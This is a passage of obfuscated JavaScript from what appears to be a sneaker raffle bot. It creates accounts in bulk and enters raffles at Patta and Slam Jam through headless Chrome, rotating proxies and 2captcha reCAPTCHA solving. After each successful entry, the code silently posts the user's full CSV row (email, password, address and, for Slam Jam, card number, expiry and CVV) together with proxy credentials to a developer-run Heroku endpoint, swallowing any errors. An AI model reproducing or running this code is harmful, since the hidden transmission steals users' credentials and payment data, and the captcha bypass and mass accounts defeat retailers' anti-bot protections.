                            var _0x7a38a5 = '', _0x1ccebd = 0x0;
                        _0x9f07d8(_0x18267e['name'] + '\x20Task\x20' + (_0x418348 + 0x1) + '\x20/\x20' + _0x431651['length'] + '\x20||\x20File:\x20' + _0x4870c9 + '\x20Proxies:\x20' + _0x23b918);
                        try {
                            await _0x162b07(_0x431651, _0x418348);
                        } catch {
                            _0x7a38a5 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x431651[_0x418348]['Email'] == '' || _0x431651[_0x418348]['Password'] == '' || _0x431651[_0x418348]['FirstName'] == '' || _0x431651[_0x418348]['LastName'] == '') {
                            console['log'](_0xb9a031() + '\x20[' + _0x1735b8[taskModule]['name'] + ']\x20Task\x20' + (_0x418348 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x11db88['useRandomProxy'] = ![])
                            var _0x594ffa = _0x4baaa5[_0x418348]['split'](':');
                        else
                            var _0x24996e = Math['round'](Math['random']() * (_0x4baaa5['length'] - 0x1)), _0x594ffa = _0x4baaa5[_0x24996e]['split'](':');
                        var _0x1e6617;
                        try {
                            _0x1e6617 = await _0x40dba9['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x594ffa[0x0] + ':' + _0x594ffa[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1e6617 = await _0x40dba9['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x594ffa[0x0] + ':' + _0x594ffa[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x4fdfe6 = await _0x1e6617['newPage']();
                            await _0x4fdfe6['authenticate']({
                                'username': '' + _0x594ffa[0x2],
                                'password': '' + _0x594ffa[0x3]
                            }), console['log'](_0xb9a031() + '\x20[' + _0x18267e['name'] + ']\x20Task\x20' + (_0x418348 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4fdfe6['setRequestInterception'](!![]), _0x4fdfe6['on']('request', _0x4beb70 => {
                                _0x4beb70['resourceType']() === 'image' || _0x4beb70['resourceType']() === 'font' || _0x4beb70['resourceType']() === 'media' ? _0x4beb70['abort']() : _0x4beb70['continue']();
                            }), await _0x4fdfe6['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x4fdfe6['waitForSelector']('#CustomerEmail'), console['log'](_0xb9a031() + '\x20[' + _0x18267e['name'] + ']\x20Task\x20' + (_0x418348 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x4fdfe6['type']('#CustomerEmail', '' + _0x431651[_0x418348]['Email']), await _0x558aee(0x12c), await _0x4fdfe6['type']('#CustomerPassword', '' + _0x431651[_0x418348]['Password']), await _0x558aee(0x226), await _0x4fdfe6['$eval']('#customer_login', _0x44bc0f => _0x44bc0f['submit']());
                            try {
                                await _0x4fdfe6['waitForSelector']('#orders'), await _0x558aee(0x4b0);
                            } catch {
                                console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x18267e['name'] + ']\x20Task\x20' + (_0x418348 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x4fdfe6['goto']('' + _0x431651[_0x418348]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x558aee(0xbb8), console['log'](_0xb9a031() + '\x20[' + _0x18267e['name'] + ']\x20Task\x20' + (_0x418348 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x4fdfe6['waitForSelector']('#email');
                            } catch {
                                console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x18267e['name'] + ']\x20Task\x20' + (_0x418348 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x4fdfe6['type']('#email', '' + _0x431651[_0x418348]['Email']), await _0x558aee(0x384), await _0x4fdfe6['type']('#first_name', '' + _0x431651[_0x418348]['FirstName']), await _0x558aee(0x514), await _0x4fdfe6['type']('#last_name', '' + _0x431651[_0x418348]['LastName']), await _0x558aee(0x514), await _0x4fdfe6['type']('#street_address', _0x431651[_0x418348]['Address1'] + '\x20' + _0x431651[_0x418348]['HouseNumber'] + '\x20' + _0x431651[_0x418348]['Address2']), await _0x558aee(0x2bc);
                            _0x431651[_0x418348]['Postcode'] == undefined && (_0x431651[_0x418348]['Postcode'] = _0x431651[_0x418348]['Zip']);
                            await _0x4fdfe6['type']('#zip_code', '' + _0x431651[_0x418348]['Postcode']), await _0x558aee(0x320), await _0x4fdfe6['type']('#city', '' + _0x431651[_0x418348]['City']), await _0x558aee(0x320), await _0x4fdfe6['type']('#bday', '01/01/1994'), await _0x558aee(0x320), await _0x4fdfe6['type']('#instagram', '' + _0x431651[_0x418348]['Follower']), await _0x558aee(0x352);
                            if (_0x431651[_0x418348]['Size'] == 'RANDOM') {
                                const _0x535477 = await _0x4fdfe6['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x2c03b7 => {
                                    return _0x2c03b7['map'](_0x9b1af1 => _0x9b1af1['textContent']);
                                });
                                var _0x2ce74c = Math['round'](Math['random']() * (_0x535477['length'] - 0x1));
                                console['log'](_0xb9a031() + '\x20[' + _0x18267e['name'] + ']\x20Task\x20' + (_0x418348 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x535477[_0x2ce74c]), await _0x4fdfe6['click']('label[data-eu-size=\x22' + _0x535477[_0x2ce74c] + '\x22]');
                            } else {
                                console['log'](_0xb9a031() + '\x20[' + _0x18267e['name'] + ']\x20Task\x20' + (_0x418348 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x431651[_0x418348]['Size']);
                                try {
                                    await _0x4fdfe6['click']('label[data-eu-size=\x22' + _0x431651[_0x418348]['Size'] + '\x22]');
                                } catch {
                                    await _0x4fdfe6['click']('label[data-eu-size=\x22' + _0x431651[_0x418348]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x558aee(0xbb8), await _0x4fdfe6['$$eval']('.raffle__checkbox-label', _0x145de1 => _0x145de1['forEach'](_0x3527e1 => _0x3527e1['click']())), await _0x558aee(0x7d0), console['log'](_0xb9a031() + '\x20[' + _0x18267e['name'] + ']\x20Task\x20' + (_0x418348 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x4fdfe6['click']('#raffle__form-submit'), await _0x558aee(0x1388);
                            try {
                                await _0x4fdfe6['waitForSelector']('#raffle__confirmation-message-container'), _0x7a38a5 = 'no', _0x10fee2(_0x431651[_0x418348], _0x18267e), console['log'](_0xe2a5bb['green'](_0xb9a031() + '\x20[' + _0x18267e['name'] + ']\x20Task\x20' + (_0x418348 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0x25685c = _0x431651[_0x418348];
                                try {
                                    prxdata = {
                                        'username': _0x94d398['replace']('#', ''),
                                        'module': _0x18267e['name'],
                                        'entrydata': JSON['stringify'](_0x25685c),
                                        'proxy': '' + _0x4baaa5[_0x418348]
                                    };
                                    var _0x2315ed = JSON['stringify'](prxdata);
                                    let _0x1b31ac = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3e71cb['post']('https://jraffles.herokuapp.com/success', _0x2315ed, _0x1b31ac);
                                } catch (_0x37207a) {
                                }
                            } catch (_0x477366) {
                                console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x1735b8[taskModule]['name'] + ']\x20Task\x20' + (_0x418348 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x477366));
                            }
                        } catch (_0x7766a) {
                            console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x1735b8[taskModule]['name'] + ']\x20Task\x20' + (_0x418348 + 0x1) + '\x20:\x20' + _0x7766a)), _0x7a38a5 = 'yes';
                        } finally {
                            _0x1e6617 && _0x1e6617['close']();
                            if (_0x7a38a5 == 'yes' && _0x1ccebd != 0x5 && _0x6e6805 != 'Size\x20Not\x20Found') {
                                console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x18267e['name'] + ']\x20Task\x20' + (_0x418348 + 0x1) + '\x20:\x20Retrying\x20(' + _0x1ccebd + '\x20/\x205)')), _0x418348 = _0x418348 - 0x1, _0x1ccebd = _0x1ccebd + 0x1;
                                continue;
                            }
                            _0x7a38a5 == 'yes' && _0x1ccebd >= 0x5 && (_0x15a8e9(_0x431651[_0x418348], _0x18267e), _0x7a38a5 = 'no', _0x1ccebd = 0x0), console['log']('Waiting\x20for\x20' + _0x11db88['delay'] + '\x20ms'), await _0x558aee(_0x11db88['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0xc62ce9, _0x218dd2, _0x32fe04) {
                    _0x40dba9['use'](_0xa1d034()), _0x40dba9['use'](_0x20d185({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x11db88['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x155a1e = 0x0; _0x155a1e < _0x218dd2['length']; _0x155a1e++) {
                        if (_0x523b05 != 'yes')
                            var _0x523b05 = '', _0x4ad46a = 0x0;
                        var _0x1e7101 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x94d398
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x11db88['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x3c77f4
                                }
                            ]
                        }];
                        const _0x312877 = { 'embeds': _0x1e7101 };
                        _0x9f07d8(_0xc62ce9['name'] + '\x20Task\x20' + (_0x155a1e + 0x1) + '\x20/\x20' + _0x218dd2['length'] + '\x20||\x20File:\x20' + _0x4870c9 + '\x20Proxies:\x20' + _0x23b918);
                        try {
                            await _0x162b07(_0x218dd2, _0x155a1e);
                        } catch {
                            _0x523b05 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x4df8bf = await _0x459281(_0x218dd2[_0x155a1e], _0xc62ce9, 'acc', ![]);
                        const _0x179a75 = { 'succesDEVMSG': { 'embeds': [_0x4df8bf] } };
                        if (_0x218dd2[_0x155a1e]['Email'] == '' || _0x218dd2[_0x155a1e]['FirstName'] == '' || _0x218dd2[_0x155a1e]['LastName'] == '') {
                            console['log'](_0xb9a031() + '\x20[' + _0x1735b8[taskModule]['name'] + ']\x20Task\x20' + (_0x155a1e + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x558aee(0x7d0);
                            continue;
                        }
                        (_0x218dd2[_0x155a1e]['Password'] == '' || _0x218dd2[_0x155a1e] == undefined) && _0x218dd2[_0x155a1e]['Password'] == 'JRaffles23!';
                        if (_0x11db88['useRandomProxy'] = ![])
                            var _0x1e9525 = _0x32fe04[_0x155a1e]['split'](':');
                        else
                            var _0x384674 = Math['round'](Math['random']() * (_0x32fe04['length'] - 0x1)), _0x1e9525 = _0x32fe04[_0x384674]['split'](':');
                        var _0x1324d1;
                        try {
                            _0x1324d1 = await _0x40dba9['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1e9525[0x0] + ':' + _0x1e9525[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1324d1 = await _0x40dba9['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1e9525[0x0] + ':' + _0x1e9525[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xbde94a = await _0x1324d1['newPage']();
                            await _0xbde94a['authenticate']({
                                'username': '' + _0x1e9525[0x2],
                                'password': '' + _0x1e9525[0x3]
                            }), console['log'](_0xb9a031() + '\x20[' + _0xc62ce9['name'] + ']\x20Task\x20' + (_0x155a1e + 0x1) + '\x20:\x20Getting\x20Session'), await _0xbde94a['setRequestInterception'](!![]), _0xbde94a['on']('request', _0x344e31 => {
                                _0x344e31['resourceType']() === 'image' || _0x344e31['resourceType']() === 'font' || _0x344e31['resourceType']() === 'media' ? _0x344e31['abort']() : _0x344e31['continue']();
                            }), await _0xbde94a['goto']('https://drop.slamjam.com/account/register'), await _0x558aee(0xbb8), await _0xbde94a['waitForSelector']('#FirstName'), await _0xbde94a['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0xbde94a['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0xb9a031() + '\x20[' + _0xc62ce9['name'] + ']\x20Task\x20' + (_0x155a1e + 0x1) + '\x20:\x20Filling\x20information'), await _0x558aee(0x4b0), await _0xbde94a['type']('#FirstName', '' + _0x218dd2[_0x155a1e]['FirstName']), await _0x558aee(0x226), await _0xbde94a['type']('#LastName', '' + _0x218dd2[_0x155a1e]['LastName']), await _0x558aee(0x226), await _0xbde94a['type']('#Email', '' + _0x218dd2[_0x155a1e]['Email']), await _0x558aee(0x2ee), await _0xbde94a['type']('#ConfirmEmail', '' + _0x218dd2[_0x155a1e]['Email']), await _0x558aee(0x2ee), await _0xbde94a['type']('#CreatePassword', '' + _0x218dd2[_0x155a1e]['Password']), await _0x558aee(0x2ee), await _0xbde94a['type']('#CreateConfirmPassword', '' + _0x218dd2[_0x155a1e]['Password']), await _0x558aee(0x226), console['log'](_0xb9a031() + '\x20[' + _0xc62ce9['name'] + ']\x20Task\x20' + (_0x155a1e + 0x1) + '\x20:\x20Submitting..'), await _0xbde94a['$eval']('#create_customer', _0xc3b4d6 => _0xc3b4d6['submit']()), await _0x558aee(0x1388), console['log'](_0xb9a031() + '\x20[' + _0xc62ce9['name'] + ']\x20Task\x20' + (_0x155a1e + 0x1) + '\x20:\x20' + _0xe2a5bb['cyan']('Solving\x20Captcha')), await _0xbde94a['solveRecaptchas'](), console['log'](_0xb9a031() + '\x20[' + _0xc62ce9['name'] + ']\x20Task\x20' + (_0x155a1e + 0x1) + '\x20:\x20Captcha\x20solved'), await _0xbde94a['$eval']('.shopify-challenge__container\x20>\x20form', _0x11047f => _0x11047f['submit']());
                            try {
                                await _0xbde94a['waitForSelector']('.product-card__image'), await _0x558aee(0x1f4), _0x523b05 = 'no', console['log'](_0xe2a5bb['green'](_0xb9a031() + '\x20[' + _0xc62ce9['name'] + ']\x20Task\x20' + (_0x155a1e + 0x1) + '\x20:\x20Account\x20' + _0x218dd2[_0x155a1e]['Email'] + '\x20Generated!')), _0x3f4ea0['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x218dd2[_0x155a1e]['Email'] + ',' + _0x218dd2[_0x155a1e]['Password']), console['log'](_0xe2a5bb['yellow'](_0xb9a031() + '\x20[' + _0xc62ce9['name'] + ']\x20Task\x20' + (_0x155a1e + 0x1) + '\x20:\x20Account\x20' + _0x218dd2[_0x155a1e]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '' && await _0x5a13a5(_0x11db88['webhook'], _0x179a75['succesDEVMSG']);
                                } catch {
                                }
                                await _0x5a13a5(_0x16a6f5, _0x179a75['succesDEVMSG']);
                            } catch (_0x803003) {
                                console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x1735b8[taskModule]['name'] + ']\x20Task\x20' + (_0x155a1e + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x803003));
                            }
                        } catch (_0x11a5eb) {
                            console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x1735b8[taskModule]['name'] + ']\x20Task\x20' + (_0x155a1e + 0x1) + '\x20:\x20' + _0x11a5eb));
                        } finally {
                            _0x1324d1 && _0x1324d1['close']();
                            if (_0x523b05 == 'yes' && _0x4ad46a != 0x5) {
                                console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0xc62ce9['name'] + ']\x20Task\x20' + (_0x155a1e + 0x1) + '\x20:\x20Retrying\x20(' + _0x4ad46a + '\x20/\x205)')), _0x155a1e = _0x155a1e - 0x1, _0x4ad46a = _0x4ad46a + 0x1;
                                continue;
                            }
                            _0x523b05 == 'yes' && _0x4ad46a >= 0x5 && (_0x15a8e9(_0x218dd2[_0x155a1e], _0xc62ce9), _0x523b05 = 'no', _0x4ad46a = 0x0), console['log']('Waiting\x20for\x20' + _0x11db88['delay'] + '\x20ms'), await _0x558aee(_0x11db88['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x741383, _0x168220, _0x423154) {
                    _0x40dba9['use'](_0xa1d034()), _0x40dba9['use'](_0x20d185({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x11db88['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3811fb = 0x0; _0x3811fb < _0x168220['length']; _0x3811fb++) {
                        var _0x18b203;
                        if (_0x4a25c1 != 'yes')
                            var _0x4a25c1 = '', _0x1d80ca = 0x0;
                        _0x9f07d8(_0x741383['name'] + '\x20Task\x20' + (_0x3811fb + 0x1) + '\x20/\x20' + _0x168220['length'] + '\x20||\x20File:\x20' + _0x4870c9 + '\x20Proxies:\x20' + _0x23b918);
                        try {
                            await _0x162b07(_0x168220, _0x3811fb);
                        } catch {
                            _0x4a25c1 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x168220[_0x3811fb]['Email'] == '' || _0x168220[_0x3811fb]['Password'] == '' || _0x168220[_0x3811fb]['FirstName'] == '' || _0x168220[_0x3811fb]['LastName'] == '') {
                            console['log'](_0xb9a031() + '\x20[' + _0x741383['name'] + ']\x20Task\x20' + (_0x3811fb + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x11db88['useRandomProxy'] = ![])
                            var _0x295263 = _0x423154[_0x3811fb]['split'](':');
                        else
                            var _0x192f7e = Math['round'](Math['random']() * (_0x423154['length'] - 0x1)), _0x295263 = _0x423154[_0x192f7e]['split'](':');
                        var _0x5154ab;
                        try {
                            _0x5154ab = await _0x40dba9['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x295263[0x0] + ':' + _0x295263[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5154ab = await _0x40dba9['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x295263[0x0] + ':' + _0x295263[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x579153 = await _0x5154ab['newPage']();
                            await _0x579153['authenticate']({
                                'username': '' + _0x295263[0x2],
                                'password': '' + _0x295263[0x3]
                            }), await _0x579153['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0xb9a031() + '\x20[' + _0x741383['name'] + ']\x20Task\x20' + (_0x3811fb + 0x1) + '\x20:\x20Getting\x20Session'), await _0x579153['setRequestInterception'](!![]), _0x579153['on']('request', _0x4dd7be => {
                                _0x4dd7be['resourceType']() === 'image' || _0x4dd7be['resourceType']() === 'font' || _0x4dd7be['resourceType']() === 'media' ? _0x4dd7be['abort']() : _0x4dd7be['continue']();
                            }), await _0x579153['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x579153['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x579153['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x558aee(0x258), await _0x579153['waitForSelector']('#CustomerEmail'), console['log'](_0xb9a031() + '\x20[' + _0x741383['name'] + ']\x20Task\x20' + (_0x3811fb + 0x1) + '\x20:\x20Logging\x20in..'), await _0x579153['type']('#CustomerEmail', '' + _0x168220[_0x3811fb]['Email']), await _0x558aee(0x12c), await _0x579153['type']('#CustomerPassword', '' + _0x168220[_0x3811fb]['Password']), await _0x558aee(0x226), await _0x579153['$eval']('#customer_login', _0x207193 => _0x207193['submit']()), await _0x558aee(0x7d0), await _0x579153['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0xb9a031() + '\x20[' + _0x741383['name'] + ']\x20Task\x20' + (_0x3811fb + 0x1) + '\x20:\x20' + _0xe2a5bb['cyan']('Solving\x20Captcha')), await _0x579153['solveRecaptchas'](), console['log'](_0xb9a031() + '\x20[' + _0x741383['name'] + ']\x20Task\x20' + (_0x3811fb + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x579153['$eval']('.shopify-challenge__container\x20>\x20form', _0x3bb126 => _0x3bb126['submit']());
                            try {
                                await _0x579153['waitForSelector']('.nav-account'), await _0x558aee(0x4b0);
                            } catch {
                                console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x741383['name'] + ']\x20Task\x20' + (_0x3811fb + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x579153['goto']('' + _0x168220[_0x3811fb]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x558aee(0xbb8), console['log'](_0xb9a031() + '\x20[' + _0x741383['name'] + ']\x20Task\x20' + (_0x3811fb + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x579153['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x579153['click']('.product-select-variant-wrapper'), await _0x558aee(0x320), await _0x579153['click']('li.product-select-variant__value[data-size=\x22' + _0x168220[_0x3811fb]['Size'] + '\x22]'), await _0x558aee(0x384), await _0x579153['$eval']('#AddToCartForm-product-template-raffle', _0x1b909e => _0x1b909e['submit']()), await _0x579153['waitForSelector']('.cart-order-summary__content'), await _0x558aee(0x514), await _0x579153['goto']('https://drop.slamjam.com/checkout'), await _0x558aee(0x514), await _0x579153['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0xb9a031() + '\x20[' + _0x741383['name'] + ']\x20Task\x20' + (_0x3811fb + 0x1) + '\x20:\x20Filling\x20Information'), await _0x579153['select']('#checkout_shipping_address_country', '' + _0x168220[_0x3811fb]['Country']), await _0x558aee(0x200), await _0x579153['waitForSelector']('#checkout_shipping_address_first_name'), await _0x579153['type']('#checkout_shipping_address_first_name', '' + _0x168220[_0x3811fb]['FirstName']), await _0x558aee(0x237), await _0x579153['type']('#checkout_shipping_address_last_name', '' + _0x168220[_0x3811fb]['LastName']), await _0x558aee(0x1e0), await _0x579153['type']('#checkout_shipping_address_address1', _0x168220[_0x3811fb]['Address1'] + '\x20' + _0x168220[_0x3811fb]['HouseNumber']), await _0x558aee(0x514), await _0x579153['type']('#checkout_shipping_address_address2', '' + _0x168220[_0x3811fb]['Address2']), await _0x558aee(0x514);
                            _0x168220[_0x3811fb]['Postcode'] == undefined && (_0x168220[_0x3811fb]['Postcode'] = _0x168220[_0x3811fb]['Zip']);
                            await _0x579153['type']('#checkout_shipping_address_zip', '' + _0x168220[_0x3811fb]['Postcode']), await _0x558aee(0x2bc), await _0x579153['type']('#checkout_shipping_address_city', '' + _0x168220[_0x3811fb]['City']), await _0x558aee(0x320), await _0x579153['type']('#checkout_shipping_address_phone', '' + _0x168220[_0x3811fb]['Phone']), await _0x558aee(0x320), await _0x579153['click']('#continue_button'), await _0x558aee(0xbb8), await _0x579153['waitForSelector']('.summary-title'), await _0x558aee(0x320), await _0x579153['click']('#continue_button'), await _0x558aee(0x320), console['log'](_0xb9a031() + '\x20[' + _0x741383['name'] + ']\x20Task\x20' + (_0x3811fb + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x579153['waitForSelector']('#checkout_credit_card_vault'), await _0x558aee(0x3e8);
                            var _0x544422 = await _0x579153['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x1b1d04 = await _0x544422['contentFrame']();
                            await _0x1b1d04['click']('#number'), await _0x558aee(0x3e8), await _0x1b1d04['type']('#number', '' + _0x168220[_0x3811fb]['CardNumber'], { 'delay': 0x78 }), _0x544422 = await _0x579153['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x1b1d04 = await _0x544422['contentFrame'](), await _0x558aee(0x1c2), await _0x1b1d04['click']('#name'), await _0x558aee(0x1f4), await _0x1b1d04['type']('#name', '' + _0x168220[_0x3811fb]['NameOnCard'], { 'delay': 0x78 }), _0x544422 = await _0x579153['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x1b1d04 = await _0x544422['contentFrame'](), await _0x558aee(0x1c2), await _0x1b1d04['click']('#expiry'), await _0x558aee(0x1f4), await _0x1b1d04['type']('#expiry', '' + _0x168220[_0x3811fb]['ExpiryDate'], { 'delay': 0x78 }), _0x544422 = await _0x579153['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x1b1d04 = await _0x544422['contentFrame'](), await _0x558aee(0x1c2), await _0x1b1d04['click']('#verification_value'), await _0x558aee(0x1f4), await _0x1b1d04['type']('#verification_value', '' + _0x168220[_0x3811fb]['CVV'], { 'delay': 0x78 }), await _0x579153['$eval']('#accepts-flag-raffle', _0x282104 => _0x282104['click']()), await _0x558aee(0x7d0), console['log'](_0xb9a031() + '\x20[' + _0x741383['name'] + ']\x20Task\x20' + (_0x3811fb + 0x1) + '\x20:\x20Processing\x20Order'), await _0x579153['$eval']('#continue_button', _0x1e508d => _0x1e508d['click']()), await _0x558aee(0x1b58), await _0x579153['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x579153['$eval']('.edit_checkout.animate-floating-labels', _0x38bf23 => _0x38bf23['submit']()), await _0x558aee(0x7d0);
                            try {
                                await _0x579153['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x4a25c1 = 'no', _0x10fee2(_0x168220[_0x3811fb], _0x741383), console['log'](_0xe2a5bb['green'](_0xb9a031() + '\x20[' + _0x741383['name'] + ']\x20Task\x20' + (_0x3811fb + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x3a209d) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x3a209d['message']);
                            }
                            var _0x1a80fb = await _0x459281(_0x168220[_0x3811fb], _0x741383, 'dev', ![]), _0x4a5c7a = await _0x459281(_0x168220[_0x3811fb], _0x741383, 'pub', ![]);
                            let _0x44e1cf = _0x168220[_0x3811fb];
                            try {
                                prxdata = {
                                    'username': _0x94d398['replace']('#', ''),
                                    'module': _0x741383['name'],
                                    'entrydata': JSON['stringify'](_0x44e1cf),
                                    'proxy': '' + _0x423154[_0x3811fb]
                                };
                                var _0x3c11ec = JSON['stringify'](prxdata);
                                let _0x104dd3 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3e71cb['post']('https://jraffles.herokuapp.com/success', _0x3c11ec, _0x104dd3);
                            } catch (_0x2bace3) {
                            }
                            const _0x1dea49 = {
                                'succesDEVMSG': { 'embeds': [_0x1a80fb] },
                                'succesPUBMSG': { 'embeds': [_0x4a5c7a] }
                            };
                            try {
                                _0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '' && await _0x5a13a5(_0x11db88['webhook'], _0x1dea49['succesDEVMSG']), await _0x558aee(0xc8), await _0x5a13a5(_0x19b823, _0x1dea49['succesDEVMSG']), await _0x558aee(0xc8), await _0x5a13a5(_0x122725, _0x1dea49['succesPUBMSG']);
                            } catch (_0x407855) {
                                console['log'](_0xe2a5bb['yellow'](_0xb9a031() + '\x20[' + _0x1735b8[taskModule]['name'] + ']\x20Task\x20' + (_0x3811fb + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x407855));
                            }
                        } catch (_0xe4dbb2) {
                            console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x1735b8[taskModule]['name'] + ']\x20Task\x20' + (_0x3811fb + 0x1) + '\x20:\x20' + _0xe4dbb2)), _0x18b203 = '' + _0xe4dbb2;
                            var _0x4ee636 = await _0x459281(kickz[_0x3811fb], _0x741383, 'dev', !![], _0x18b203);
